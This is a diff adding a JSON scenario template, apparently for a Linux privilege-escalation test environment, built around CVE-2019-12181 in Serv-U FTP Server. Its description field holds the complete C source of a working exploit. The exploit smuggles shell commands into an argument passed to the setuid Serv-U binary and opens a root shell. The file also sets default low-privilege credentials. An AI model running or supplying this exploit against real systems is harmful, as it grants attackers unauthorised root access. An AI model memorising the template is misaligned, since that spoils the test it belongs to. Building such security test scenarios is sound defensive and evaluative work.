@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47009",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1) (CVE-2019-12181)\n\nExploit source code (47009.c):\n```\n/*\n\nCVE-2019-12181 Serv-U 15.1.6 Privilege Escalation\n\nvulnerability found by:\nGuy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev\n\nto compile and run:\ngcc servu-pe-cve-2019-12181.c -o pe && ./pe\n\n*/\n\n#include <stdio.h>\n#include <unistd.h>\n#include <errno.h>\n\nint main()\n{\n    char *vuln_args[] = {\"\\\" ; id; echo 'opening root shell' ; /bin/sh; \\\"\", \"-prepareinstallation\", NULL};\n    int ret_val = execv(\"/usr/local/Serv-U/Serv-U\", vuln_args);\n    // if execv is successful, we won't reach here\n    printf(\"ret val: %d errno: %d\\n\", ret_val, errno);\n    return errno;\n}\n```",
+  "cve": "CVE-2019-12181",
+  "exploitdb_id": "47009",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47009",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
